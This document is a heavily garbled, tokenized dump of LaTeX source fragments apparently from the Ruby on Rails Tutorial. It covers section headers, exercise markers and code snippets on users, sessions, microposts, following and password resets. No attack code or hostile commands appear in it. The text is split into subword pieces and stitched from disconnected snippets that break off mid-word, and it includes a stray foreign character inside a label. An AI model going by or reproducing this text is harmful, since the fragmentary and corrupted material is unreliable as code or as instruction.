▁d =' ex - ce 39 07 ' ></ span >< n >\ end { enumerate }< n >< n >\ begin { figure }< n >\ begin { center }< n >\ image { images / figures / hola _ mundo . png }< n >\ end { center }< n >\ caption { Chang ing ▁the ▁root ▁route ▁to ▁return ▁`` ¡ H ol a , ▁ mundo ! ''. \ label { fig : hola _ mundo } }< n >\ end { figure }< n >< n >\ begin { figure }< n >\ begin { center }< n >\ image { images / figures / goodbye _ world . png }< n >\ end { center }< n >\ caption { Chang ing ▁the ▁root ▁route ▁to ▁return ▁`` goodbye , ▁world ! ''. \ label { fig : goodbye _ world } }< n >\ end { figure }< n >< n >% ▁subsection ▁ hello _ world ▁( end )< n >< n > ▁% ▁section ▁up _ and _ running ▁( end )< n >< n > ▁\ section { Version ▁control ▁with ▁Git } ▁% ▁( fold )< n > ▁\ label { sec : version _ control }< n >< n >
▁< n >< n > ▁\ subsection { What ▁good ▁does ▁Git ▁do ▁you ? }< n > ▁\ label { sec : what _ g ood _ do es _ git _ do _ you }< n >< n > If ▁you ' ve ▁ never ▁used ▁version ▁control ▁before , ▁it ▁may ▁not ▁be ▁entire ly ▁clear ▁at ▁this ▁point ▁what ▁good ▁it ▁does ▁you , ▁so ▁let ▁me ▁give ▁just ▁one ▁example .
▁< n >< n > ▁\ subsection { Heroku ▁deployment , ▁step ▁two }< n > ▁\ label { sec : heroku _ step _ two }< n >< n > The re ▁is ▁no ▁step ▁two !
▁te }< n >< n > ▁\ subsection { Heroku ▁commands }< n > ▁\ label { sec : heroku _ command s }< n >< n >
▁on ▁deploying ▁( end )< n >< n > ▁\ section { Co nclusion } ▁% ▁( fold )< n > ▁\ label { sec : beginning _ co nclusion }< n >< n >
▁id e ▁the ▁IDE ▁itself . )< n >< n > ▁\ subsection { A ▁user ▁to ur } ▁% ▁( fold )< n > ▁\ label { sec : a _ user _ to ur }< n >< n >
▁ al id ▁email ▁address , ▁like ▁`` @ example . com '' ? < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 6 ac cd 1 ' ></ span >< n >< n > ▁\ item ▁ Destroy ▁each ▁of ▁the ▁users ▁created ▁in ▁the ▁previous ▁ exercises . ▁Doe s ▁Rails ▁display ▁a ▁message ▁by ▁default ▁when ▁a ▁user ▁is ▁destroyed ? < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - a b c 7 b d ' ></ span >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁a _ user _ to ur ▁( end )< n >< n > ▁\ subsection { MVC ▁in ▁action } ▁% ▁( fold )< n > ▁\ label { sec : mvc _ in _ action }< n >< n >
▁m er ate }< n >< n > ▁% ▁subsection ▁ mvc _ in _ action ▁( end )< n >< n > ▁\ subsection { We a k n es s es ▁of ▁this ▁Users ▁resource } ▁% ▁( fold )< n > ▁\ label { sec : we a k n es s es _ of _ this _ users _ resource }< n >< n >
▁validates ▁ FILL _ IN , ▁presence : ▁true ▁# ▁Re place ▁ FILL _ IN ▁with ▁the ▁right ▁code . < n > ▁validates ▁ FILL _ IN , ▁presence : ▁true ▁# ▁Re place ▁ FILL _ IN ▁with ▁the ▁right ▁code . < n > end < n >\ end { code }< n >\ end { code listing }< n >< n >\ begin { figure }< n >\ begin { center }< n >\ image { images / figures / user _ presence _ validations . png }< n >\ end { center }< n >\ caption { The ▁effect ▁of ▁presence ▁validations ▁on ▁the ▁User ▁model . \ label { fig : user _ presence _ validations } }< n >\ end { figure }< n >< n > ▁% ▁subsection ▁ demo _ user _ has _ many _ microposts ▁( end )< n >< n > ▁\ subsection { In h er it ance ▁ hierarchies } ▁% ▁( fold )< n > ▁\ label { sec : inheritance _ hierarchies }< n >< n >
▁te }< n >< n > ▁% ▁subsection ▁inheritance _ hierarchies ▁( end )< n >< n > ▁\ subsection { D e p lo ying ▁the ▁toy ▁app } ▁% ▁( fold )< n > ▁\ label { sec : deploying _ the _ toy _ app }< n >< n >
▁ { code : demo _ length _ validation } ▁works ▁on ▁the ▁production ▁app . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - de b cc 6 ' ></ span >< n >\ end { enumerate }< n >< n > ▁\ section { Co nclusion } ▁% ▁( fold )< n > ▁\ label { sec : toy _ app _ co nclusion }< n >< n >
▁ _ app _ setup ▁( end )< n >< n > ▁\ section { S t at ic ▁pages } ▁% ▁( fold )< n > ▁\ label { sec : static _ pages }< n >< n >
▁< span ▁class =' exercise ' ▁id =' ex - b 6 b 11 4 ' ></ span >< n >\ end { enumerate }< n >< n >% ▁subsection ▁generated _ static _ pages ▁( end )< n >< n >\ subsection { C us to m ▁static ▁pages } ▁% ▁( fold )< n >\ label { sec : custom _ static _ pages }< n >< n >
▁< n >\ end { code }< n >\ end { code listing }< n >< n >< n > ▁% ▁subsection ▁testing _ title s ▁( end )< n >< n > ▁\ subsection { Adding ▁page ▁title s ▁( G re en )} ▁% ▁( fold )< n > ▁\ label { sec : adding _ page _ title s }< n >< n >
▁\ end { code }< n >\ end { code listing }< n >< n > ▁% ▁subsection ▁adding _ page _ title s ▁( end )< n >< n > ▁\ subsection { Layout s ▁and ▁ embedded ▁Ruby ▁( Re factor )} ▁% ▁( fold )< n > ▁\ label { sec : layouts _ and _ embedded _ ruby }< n >< n >
▁d { code }< n >\ end { code listing }< n >< n >< n >\ subsection { S et ting ▁the ▁root ▁route } ▁% ▁( fold )< n >\ label { sec : set ting _ the _ root _ route }< n >< n >
▁ }< n >< n >% ▁subsection ▁setting _ the _ root _ route ▁( end )< n >< n > ▁% ▁section ▁slightly _ dynamic _ pages ▁( end )< n >< n > ▁\ section { Co nclusion } ▁% ▁( fold )< n > ▁\ label { sec : static _ pages _ co nclusion }< n >< n > S e en ▁from ▁the ▁outside , ▁this ▁chapter ▁hard ly ▁accomplish ed ▁anything : ▁we ▁started ▁with ▁static ▁pages , ▁and ▁end ed ▁with \ l do t s \ ▁\ emph { most ly } ▁static ▁pages .
▁\ subsection { B ac k t ra ce ▁ silencer } ▁% ▁( fold )< n >%
▁% ▁subsection ▁ backtrace _ silencer ▁( end )< n >< n > ▁\ subsection { A u to m at ed ▁tests ▁with ▁Guard } ▁% ▁( fold )< n > ▁\ label { sec : guard }< n >< n >
▁- b ▁updating - users < n >\ end { code }< n >< n > ▁\ subsection { Edit ▁form } ▁% ▁( fold )< n > ▁\ label { sec : edit _ form }< n >< n > We ▁start ▁with ▁the ▁edit ▁form , ▁who se ▁mockup ▁appears ▁in ▁F igure ~\ ref { fig : edit _ user _ mockup }. \ foo t not e { Image ▁retrieved
▁ umerate }< n >< n > ▁% ▁subsection ▁ unsuccessful _ edit s ▁( end )< n >< n > ▁\ subsection { Test ing ▁ unsuccessful ▁edit s } ▁% ▁( fold )< n > ▁\ label { sec : test ing _ unsuccessful _ edit s }< n >< n >
▁g ▁the ▁text ▁`` The ▁form ▁contains ▁4 ▁errors . '' < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - fa a 5 fa ' ></ span >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁testing _ unsuccessful _ edit s ▁( end )< n >< n > ▁\ subsection { S u cc es s ful ▁edit s ▁( with ▁ TDD )} ▁% ▁( fold )< n > ▁\ label { sec : successful _ edit s }< n >< n >
▁ u ▁change ▁the ▁email ▁address ▁to ▁one ▁without ▁an ▁ associated ▁Gravatar ? < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 0 5 a a 0 f ' ></ span >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁ en a b l ing _ edit s ▁( end )< n >< n > ▁% ▁section ▁updating _ users ▁( end )< n >< n > ▁\ section { Auth or i z ation } ▁% ▁( fold )< n > ▁\ label { sec : authorization }< n >< n >
▁ umerate }< n >< n > ▁% ▁subsection ▁requiring _ logged _ in _ users ▁( end )< n >< n > ▁\ subsection { Requir ing ▁the ▁right ▁user } ▁% ▁( fold )< n > ▁\ label { sec : requiring _ the _ right _ user }< n >< n >
▁te }< n >< n > ▁% ▁subsection ▁requiring _ the _ right _ user ▁( end )< n >< n > ▁\ subsection { F r i end ly ▁forwarding } ▁% ▁( fold )< n > ▁\ label { sec : friendly _ forwarding }< n >< n >
▁< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁ friendly _ forwarding ▁( end )< n >< n > ▁% ▁section ▁protect ing _ pages ▁( end )< n >< n > ▁\ section { S how ing ▁all ▁users } ▁% ▁( fold )< n > ▁\ label { sec : showing _ all _ users }< n >< n >
▁ umerate }< n >< n > ▁% ▁subsection ▁user _ index ▁( end )< n >< n > ▁\ subsection { S ample ▁users } ▁% ▁( fold )< n > ▁\ label { sec : sample _ users }< n >< n >
▁ umerate }< n >< n > ▁% ▁subsection ▁sample _ users ▁( end )< n >< n > ▁\ subsection { P a g in ation } ▁% ▁( fold )< n > ▁\ label { sec : pagination }< n >< n >
▁< n >< n >% ▁subsection ▁user _ index _ test ▁( end )< n >< n > ▁\ subsection { Partial ▁refactoring } ▁% ▁( fold )< n > ▁\ label { sec : partial _ refactoring }< n >< n >
▁ ting ▁tests ▁are ▁\ failing . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - d 0 d 59 d ' ></ span >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁partial _ refactoring ▁( end )< n >< n > ▁% ▁section ▁show ing _ users ▁( end )< n >< n > ▁\ section { D e let ing ▁users } ▁% ▁( fold )< n > ▁\ label { sec : deleting _ users }< n >< n >
▁< n >< n >% ▁subsection ▁user _ destroy _ tests ▁( end )< n >< n > ▁% ▁section ▁deleting _ users ▁( end )< n >< n > ▁\ section { Co nclusion } ▁% ▁( fold )< n > ▁\ label { sec : updating _ and _ deleting _ users _ co nclusion }< n >< n >
▁\ subsection { Micropost ▁validations } ▁% ▁( fold )< n > ▁\ label { sec : micropost _ validations }< n >< n >
▁< n >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁micropost _ validations ▁( end )< n >< n > ▁\ subsection { User / Micropost ▁associations } ▁% ▁( fold )< n > ▁\ label { sec : user _ micropost _ associations }< n >< n >
▁< n >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁user _ micropost _ associations ▁( end )< n >< n > ▁\ subsection { Micropost ▁refinement s } ▁% ▁( fold )< n > ▁\ label { sec : order ing _ and _ dependency }< n >< n >
▁ ing ▁\ k ode { Micropost . find } ▁that ▁the ▁user ' s ▁first ▁micropost ▁was ▁also ▁destroyed . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - ec 2 e 6 b ' ></ span >< n >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁order ing _ and _ dependency ▁( end )< n >< n > ▁% ▁section ▁a _ micropost _ model ▁( end )< n >< n > ▁\ section { S how ing ▁microposts } ▁% ▁( fold )< n > ▁\ label { sec : showing _ microposts }< n >< n >
▁ n ▁class =' exercise ' ▁id =' ex - d f 8 f b d ' ></ span >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁rendering _ microposts ▁( end )< n >< n > ▁\ subsection { S ample ▁microposts } ▁% ▁( fold )< n > ▁\ label { sec : sample _ microposts }< n >< n >
▁exercise ' ▁id =' ex - c 6 f 9 7 5 ' ></ span >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁sample _ microposts ▁( end )< n >< n >\ subsection { Pro file ▁micropost ▁tests } ▁% ▁( fold )< n >\ label { sec : profile _ micropost _ tests }< n >< n >
▁ n >< n >\ end { enumerate }< n >< n >% ▁subsection ▁profile _ micropost _ tests ▁( end )< n >< n > ▁% ▁section ▁show ing _ microposts ▁( end )< n >< n > ▁\ section { M anipulating ▁microposts } ▁% ▁( fold )< n > ▁\ label { sec : m anipulating _ microposts }< n >< n >
▁ n >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁access _ control ▁( end )< n >< n > ▁\ subsection { C re at ing ▁microposts } ▁% ▁( fold )< n > ▁\ label { sec : creating _ microposts }< n >< n >
▁ umerate }< n >< n > ▁% ▁subsection ▁creating _ microposts ▁( end )< n >< n > ▁\ subsection { A ▁proto - feed } ▁% ▁( fold )< n > ▁\ label { sec : a _ proto _ feed }< n >< n >
▁are ▁all ▁the ▁same . ▁\ emph { Hint } : ▁It ' s ▁ probably ▁easie st ▁to ▁compare ▁directly ▁using ▁\ k ode {==} . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - e 4 e f 4 b ' ></ span >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁a _ proto _ feed ▁( end )< n >< n > ▁\ subsection { Destroy ing ▁microposts } ▁% ▁( fold )< n > ▁\ label { sec : destroy ing _ microposts }< n >< n >
▁te }< n >< n > ▁% ▁subsection ▁destroying _ microposts ▁( end )< n >< n >\ subsection { Micropost ▁tests } ▁% ▁( fold )< n >\ label { sec : micropost _ tests }< n >< n >
▁< n > ▁other _ user ▁= ▁users (: ma lo ry )< n > ▁log _ in _ as ( other _ user )< n > ▁get ▁root _ path < n > ▁ assert _ match ▁" 0 ▁microposts ", ▁response . body < n > ▁other _ user . microposts . create ! ( content : ▁" A ▁micropost " )< n > ▁get ▁root _ path < n > ▁ assert _ match ▁ FILL _ IN , ▁response . body < n > ▁end < n > end < n >\ end { code }< n >\ end { code listing }< n >< n >% ▁subsection ▁micropost _ tests ▁( end )< n >< n > ▁% ▁section ▁m anipulating _ microposts ▁( end )< n >< n >< n > ▁\ section { Micropost ▁images } ▁% ▁( fold )< n > ▁\ label { sec : micropost _ images }< n >< n >
▁ u b section ▁basic _ image _ upload ▁( end )< n >< n >< n >\ subsection { Image ▁validation } ▁% ▁( fold )< n >\ label { sec : image _ validation }< n >< n >
▁end { enumerate }< n >< n >% ▁subsection ▁image _ validation ▁( end )< n >< n >\ subsection { Image ▁ resizing } ▁% ▁( fold )< n >\ label { sec : image _ resizing }< n >< n >
▁ s ting }< n >< n >\ subsection { Image ▁upload ▁in ▁production } ▁% ▁( fold )< n >\ label { sec : image _ upload _ in _ production }< n >< n >
▁b section ▁image _ upload _ in _ production ▁( end )< n >< n > ▁% ▁section ▁micropost _ images ▁( end )< n >< n > ▁\ section { Co nclusion } ▁% ▁( fold )< n > ▁\ label { sec : user _ microposts _ co nclusion }< n >< n > With ▁the ▁addition ▁of ▁the ▁Microposts ▁resource , ▁we ▁are ▁ nearly ▁finished ▁with ▁our ▁sample ▁application .
▁\ chapter { Follow ing ▁users }< n >\ label { cha : following _ users }< n >< n >
▁< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁a _ problem _ with _ the _ data _ model ▁( end )< n >< n > ▁\ subsection { User / relationship ▁associations } ▁% ▁( fold )< n > ▁\ label { sec : relationship _ user _ associations }< n >< n >
▁end { enumerate }< n >< n > ▁% ▁subsection ▁relationship _ user _ associations ▁( end )< n >< n > ▁\ subsection { Relation s h ip ▁validations } ▁% ▁( fold )< n > ▁\ label { sec : relationship _ validations }< n >< n >
▁ ge ▁as ▁of ▁Rails ~ 5 , ▁and ▁in ▁previous ▁versions ▁of ▁Rails ▁the ▁validations ▁are ▁required . ▁We ' ll ▁plan ▁to ▁leave ▁them ▁in ▁for ▁completeness , ▁but ▁it ' s ▁worth ▁be ar ing ▁in ▁mind ▁that ▁you ▁may ▁see ▁these ▁validations ▁omitted ▁in ▁other ▁people ' s ▁code . )< n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 000 3 a 9 ' ></ span >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁relationship _ validations ▁( end )< n >< n > ▁\ subsection { Follow ed ▁users } ▁% ▁( fold )< n > ▁\ label { sec : following }< n >< n >
▁ ex - b 4 b b b 0 ' ></ span >< n >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁sample _ following _ data ▁( end )< n >< n > ▁\ subsection { S t at s ▁and ▁a ▁follow ▁form } ▁% ▁( fold )< n > ▁\ label { sec : stats _ and _ a _ follow _ form }< n >< n >
▁< n >< n > ▁\ subsection { A ▁working ▁follow ▁button ▁the ▁standard ▁way } ▁% ▁( fold )< n > ▁\ label { sec : a _ working _ follow _ button _ the _ standard _ way }< n >< n >
▁ umerate }< n >< n > ▁% ▁subsection ▁a _ working _ follow _ button _ the _ standard _ way ▁( end )< n >< n > ▁\ subsection { A ▁working ▁follow ▁button ▁with ▁Ajax } ▁% ▁( fold )< n > ▁\ label { sec : a _ working _ follow _ button _ with _ ajax }< n >< n >
▁ umerate }< n >< n > ▁% ▁subsection ▁a _ working _ follow _ button _ with _ ajax ▁( end )< n >< n > ▁\ subsection { Follow ing ▁tests } ▁% ▁( fold )< n > ▁\ label { sec : following _ tests }< n >< n >
▁in ▁the ▁previous ▁exercise ▁would ▁catch ▁it . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 9 06 99 b ' ></ span >< n >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁following _ tests ▁( end )< n >< n > ▁% ▁section ▁a _ web _ interface _ for _ following _ and _ followers ▁( end )< n >< n > ▁\ section { The ▁status ▁feed } ▁% ▁( fold )< n > ▁\ label { sec : the _ status _ feed }< n >< n >
▁ n >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁ motivation _ and _ s trategy ▁( end )< n >< n > ▁\ subsection { A ▁first ▁feed ▁implementation } ▁% ▁( fold )< n > ▁\ label { sec : a _ first _ feed _ implementation }< n >< n > With ▁the ▁status ▁feed ▁design ▁requirements ▁capture d ▁in ▁the ▁test ▁from ▁Listing ▁\ ref { code : full _ feed _ test }, ▁we ' re ▁ready ▁to ▁start ▁writing ▁the ▁feed .
▁ _ first _ feed _ implementation ▁( end )< n >< n > ▁\ subsection { S u b select s } ▁% ▁( fold )< n > ▁\ label { sec : scope s _ subselect s _ and _ a _ lambda }< n >< n >
▁ n d < n > ▁end < n > end < n >\ end { code }< n >\ end { code listing }< n >< n > ▁% ▁subsection ▁scope s _ subselect s _ and _ a _ lambda ▁( end )< n >< n > ▁\ section { Co nclusion } ▁% ▁( fold )< n > ▁\ label { sec : following _ co nclusion }< n >< n >
▁\ emph { Hint } : ▁Use ▁\ k ode { user . reload } ▁to ▁retrieve ▁the ▁new ▁value . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 140 f 50 ' ></ span >< n >< n >\ end { enumerate }< n >< n >% ▁subsection ▁updating _ the _ reset ▁( end )< n >< n >\ subsection { Password ▁reset ▁test } ▁% ▁( fold )< n >\ label { sec : password _ reset _ test }< n >< n >
▁mail _ in _ production ▁( end )< n >< n >% ▁section ▁password _ reset ▁( end )< n >< n >\ section { Co nclusion } ▁% ▁( fold )< n >\ label { sec : resets _ co nclusion }< n >< n >
▁< n >< n >\ section { Account ▁activation s ▁resource } ▁% ▁( fold )< n >\ label { sec : account _ activation s _ resource }< n >< n >
▁( end )< n >< n >\ section { A c t i v at ing ▁the ▁account } ▁% ▁( fold )< n >\ label { sec : activating _ the _ account }< n >< n >
▁ n _ edit _ action ▁( end )< n >< n >% ▁section ▁ activating _ the _ account ▁( end )< n >< n >\ subsection { A c t i v ation ▁test ▁and ▁refactoring } ▁% ▁( fold )< n >\ label { sec : activation _ test _ and _ refactoring }< n >< n >
▁list ing }< n >< n >\ subsection { Log in ▁with ▁remember ing } ▁% ▁( fold )< n >\ label { sec : login _ with _ remember ing }< n >< n >
▁ }< n >< n >% ▁subsection ▁login _ with _ remember ing ▁( end )< n >< n >\ subsection { For getting ▁users } ▁% ▁( fold )< n >\ label { sec : for getting _ users }< n >< n >
▁getting _ users ▁( end )< n >< n >\ subsection { T w o ▁subtle ▁bug s } ▁% ▁( fold )< n >\ label { sec : two _ sub t le _ b ug s }< n >< n >
▁ }< n >< n >% ▁subsection ▁two _ sub t le _ b ug s ▁( end )< n >< n >\ section { ` ` Re member ▁me '' ▁checkbox } ▁% ▁( fold )< n >\ label { sec : remember _ me _ checkbox }< n >< n >
▁ ection { Ex er ci s es }< n >\ label { sec : exercises _ remember _ me }< n >< n >\ input { f ra g ment s / so ci et y _ exercises _ not e }< n >< n >\ begin { enumerate }< n > ▁\ item ▁By ▁ inspect ing ▁your ▁browser ' s ▁cookies ▁directly , ▁verify ▁that ▁the ▁`` remember ▁me '' ▁checkbox ▁is ▁ having ▁its ▁intend ed ▁effect . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 0 c 1 e 9 6 ' ></ span >< n >< n > ▁\ item ▁At ▁the ▁console , ▁in v ent ▁examples ▁show ing ▁both ▁possible ▁behavior s ▁of ▁the ▁ ternary ▁operator ▁( B o x ~\ ref { aside : ternary _ o p er at or }). < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 6 3 ac 7 3 ' ></ span >< n >\ end { enumerate }< n >< n >% ▁section ▁remember _ me ▁( end )< n >< n >\ section { Re member ▁tests } ▁% ▁( fold )< n >\ label { sec : remember _ tests }< n >< n >
▁\ section { Co nclusion } ▁% ▁( fold )< n > ▁\ label { sec : advance d _ login _ co nclusion }< n >< n >
▁< n >< n >\ subsection { What ▁we ▁ learned ▁in ▁this ▁chapter } ▁% ▁( fold )< n >\ label { sec : advance d _
▁< n >< n > ▁\ section { Session s }< n > ▁\ label { sec : sessions _ and _ failed _ login }< n >< n >
▁in < n >\ end { code }< n >< n > ▁\ subsection { Session s ▁controller } ▁% ▁( fold )< n > ▁\ label { sec : sessions _ controller }< n >< n >
▁ ul t s ▁of ▁\ k ode { rails ▁routes } ▁to ▁\ k ode { g re p }, ▁list ▁all ▁the ▁routes ▁ associated ▁with ▁the ▁Users ▁resource . ▁Do ▁the ▁same ▁for ▁Sessions . ▁How ▁many ▁routes ▁does ▁each ▁resource ▁have ? ▁\ emph { Hint } : ▁Re f er ▁to ▁the ▁\ href { https :// www . learn en ough . com / command - line - tutorial # sec - g re p p ing }{ section ▁on ▁g re p } ▁in ▁\ le c l . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 06 1 c 5 c ' ></ span >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁sessions _ controller ▁( end )< n >< n > ▁\ subsection { Log in ▁form } ▁% ▁( fold )< n > ▁\ label { sec : login _ form }< n >< n >
▁ umerate }< n >< n > ▁% ▁subsection ▁login _ form ▁( end )< n >< n > ▁\ subsection { F in d ing ▁and ▁ authenticating ▁a ▁user } ▁% ▁( fold )< n > ▁\ label { sec : find ing _ and _ authenticating _ a _ user }< n >< n >
▁ umerate }< n >< n > ▁% ▁subsection ▁find ing _ and _ authenticating _ a _ user ▁( end )< n >< n > ▁\ subsection { Render ing ▁with ▁a ▁flash ▁message } ▁% ▁( fold )< n > ▁\ label { sec : render ing _ with _ a _ flash _ message }< n >< n >
▁ ge . < n > %= ▁< span ▁class =' exercise ' ▁id =' ex - 2 e 6 3 5 3 ' ></ span >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁a _ flash _ test ▁( end )< n >< n > ▁% ▁section ▁login _ failure ▁( end )< n >< n > ▁\ section { Log g ing ▁in } ▁% ▁( fold )< n > ▁\ label { sec : logging _ in }< n >< n >
▁te }< n >< n > ▁% ▁subsection ▁a _ working _ log _ in _ method ▁( end )< n >< n >< n >\ subsection { C ur r ent ▁user } ▁% ▁( fold )< n >\ label { sec : current _ user }< n >< n >
▁ u b section ▁current _ user ▁( end )< n >< n > ▁\ subsection { Chang ing ▁the ▁layout ▁links } ▁% ▁( fold )< n > ▁\ label { sec : cha n g ing _ the _ layout _ links }< n >< n >
▁ n ▁this ▁step ▁( B o x ~\ ref { aside : technical _ so ph ist ic ation }). )< n > %= ▁< span ▁class =' exercise ' ▁id =' ex - d f 6 7 d 8 ' ></ span >< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁changing _ the _ layout _ links ▁( end )< n >< n > ▁\ subsection { Test ing ▁layout ▁changes } ▁% ▁( fold )< n > ▁\ label { sec : test ing _ layout _ change s }< n >< n >
▁ umerate }< n >< n > ▁% ▁subsection ▁layout _ link _ tests ▁( end )< n >< n > ▁\ subsection { Log in ▁upon ▁signup } ▁% ▁( fold )< n > ▁\ label { sec : login _ upon _ signup }< n >< n >
▁< n >\ end { enumerate }< n >< n > ▁% ▁subsection ▁login _ upon _ signup ▁( end )< n >< n > ▁% ▁section ▁login _ success ▁( end )< n >< n > ▁\ section { Log g ing ▁out } ▁% ▁( fold )< n > ▁\ label { sec : logging _ out }< n >< n >
▁end
▁else
▁A ▁ generalized ▁\ k ode { authenticated ? }
▁Using ▁the ▁ generalized ▁\ k ode { authenticated ? }
▁in ▁Listing ~\ ref { code : show _ only _ と c tive _ users _ exercise }.
▁To ▁get ▁this ▁to ▁work , ▁we ▁need ▁to ▁define ▁the ▁\ k ode { password _ reset _ expired ? }
▁ Initial ▁commit
▁The ▁M I T ▁L ic en se
▁As ▁long ▁as ▁you ▁re t a in ▁this ▁notice ▁you
▁WHERE ▁follower _ id ▁= ▁: user _ id "
▁as ▁show n ▁in ▁Listing ~\ ref { code : users _ controller _ test _ login _ route }.
▁ PATCH
▁in ▁Listing ~\ ref { code : login _ upon _ signup } ▁and
▁route ▁resources ▁: users
▁route ▁resources ▁: microposts
▁=> ▁[ # < Micropost ▁id : ▁1, ▁content : ▁" First ▁micropost !" , ▁user _ id : ▁1, ▁< n > created _ at :
▁Load ing ▁development ▁environment
▁ >> ▁Rails . env
▁=> ▁" development "
▁ >> ▁Rails . env . development ?
▁ >> ▁Rails . env . test ?
▁=> ▁false
▁As ▁you ▁can ▁see , ▁Rails ▁provides ▁a ▁\ text tt { Rails } ▁object ▁with ▁an ▁\ text tt { env } ▁attribute ▁and ▁ associated ▁environment ▁boolean ▁methods , ▁so ▁that , ▁for ▁example , ▁\ text tt { Rails . env . test ? }
▁Load ing ▁test ▁environment
▁=> ▁" test "
▁=> ▁" production "
▁ >> ▁Rails . env . production ?
▁< n > ▁< n > ▁end
▁This ▁is ▁the ▁home ▁page ▁for ▁the
▁sample ▁application .
▁G et ▁help ▁on ▁the ▁Ruby ▁on ▁Rails ▁Tutorial ▁at ▁the
▁To ▁get ▁help ▁on ▁this ▁sample ▁app , ▁see ▁the
▁< n > ▁| ▁Ruby ▁on ▁Rails ▁Tutorial ▁S ample ▁App
▁=> ▁#< User : 0 x 22 5 16 7 c ▁@ email =" mhartl @ example . com ", < n > @ name =" Michael ▁Hartl ">
▁< n >< n > ▁ $ ▁rails ▁console
▁A ▁test ▁of ▁\ k ode { authenticated ? }
▁ Updating ▁\ k ode { authenticated ? }
▁T hanks ▁to ▁reader ▁\ href { https :// twitter . com / c ol m t u ite }{ C ol m ▁T u ite } ▁for ▁his ▁excellent ▁work ▁in ▁help ing ▁to ▁convert ▁the ▁sample ▁application ▁over ▁to ▁the ▁Bootstrap ▁CSS ▁framework .
▁There ▁are ▁also ▁two ▁common ▁ways ▁to ▁specify ▁a ▁gem ▁version ▁range , ▁which ▁allows ▁us ▁to ▁ ex er t ▁some ▁control ▁over ▁the ▁version ▁used ▁by ▁Rails .
▁L uckily , ▁the ▁solution ▁is ▁straightforward ▁to ▁implement : ▁we ▁just ▁need ▁to ▁enforce ▁uniqueness ▁at ▁the ▁database ▁level ▁as ▁well ▁as ▁at ▁the ▁model ▁level .
▁Here ▁we ▁have ▁reuse d ▁the ▁ shared ▁\ k ode { error \_ messages } ▁partial ▁introduce d ▁in ▁Section ~\ ref { sec : signup _ error _ messages }.
▁With ▁the ▁\ k ode {@ user } ▁instance ▁variable ▁from ▁Listing ~\ ref { code : initial _ edit _ action }, ▁the ▁edit ▁page ▁should ▁render ▁properly , ▁as ▁show n ▁in ▁F igure ~\ ref { fig : edit _ page }.
▁There ' s ▁another ▁subtlety ▁to ▁address ▁here : ▁the ▁code ▁\ k ode { form \_ for (@ user )} ▁in ▁Listing ~\ ref { code : user _ edit _ view } ▁is ▁\ emph { exactly } ▁the ▁same ▁as ▁the ▁code ▁in ▁Listing ~\ ref { code : signup _ form }--- so ▁how ▁does ▁Rails ▁know ▁to ▁use ▁a ▁\ text tt { POST } ▁request ▁for ▁new ▁users ▁and ▁a ▁\ text tt { PATCH } ▁for ▁editing ▁users ?
▁This ▁is ▁easy ▁using ▁the ▁named ▁route ▁\ k ode { edit \_ user \_ path } ▁from ▁Table ~\ ref { table : RESTful _ users }, ▁together ▁with ▁the ▁hand y ▁\ k ode { current \_ user } ▁helper ▁method ▁defined ▁in ▁Listing ~\ ref { code : persistent _ current _ user } :
▁A ▁test ▁for ▁an ▁ unsuccessful ▁edit .
▁The ▁\ href { http :// gravatar . com /}{ Gravatar } ▁image - c r o p p ing ▁interface , ▁with ▁a ▁ picture ▁of ▁\ href { http :// www . michael hartl . com /}{ some ▁ dude }.
▁Note ▁also ▁the ▁use ▁of ▁\ k ode {@ user . reload } ▁( first ▁seen ▁in ▁Section ~\ ref { sec : updating _ user _ objects }) ▁to ▁reload ▁the ▁user ' s ▁values ▁from ▁the ▁database ▁and ▁confirm ▁that ▁they ▁were ▁successfully ▁updated .
▁The ▁\ k ode { update } ▁action ▁needed ▁to ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : successful _ edit _ test } ▁to ▁pass ▁is ▁similar ▁to ▁the ▁final ▁form ▁of ▁the ▁\ k ode { create } ▁action ▁( Listing ~\ ref { code : login _ upon _ signup }), ▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ update _ action }.
▁A l low ing ▁empty ▁passwords ▁on ▁update .
▁With ▁the ▁code ▁in ▁this ▁section , ▁the ▁user ▁edit ▁page ▁should ▁be ▁working ▁( F igure ~\ ref { fig : edit _ form _ working }), ▁as ▁you ▁can ▁double - check ▁by ▁re - running ▁the ▁test ▁suite , ▁which ▁should ▁now ▁be ▁\ passing :
▁To ▁require ▁users ▁to ▁be ▁logged ▁in , ▁we ▁define ▁a ▁\ k ode { logged \_ in \_ user } ▁method ▁and ▁invoke ▁it ▁using ▁\ k ode { before \_ action ▁: logged \_ in \_ user }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : authorize _ before _ filter }.
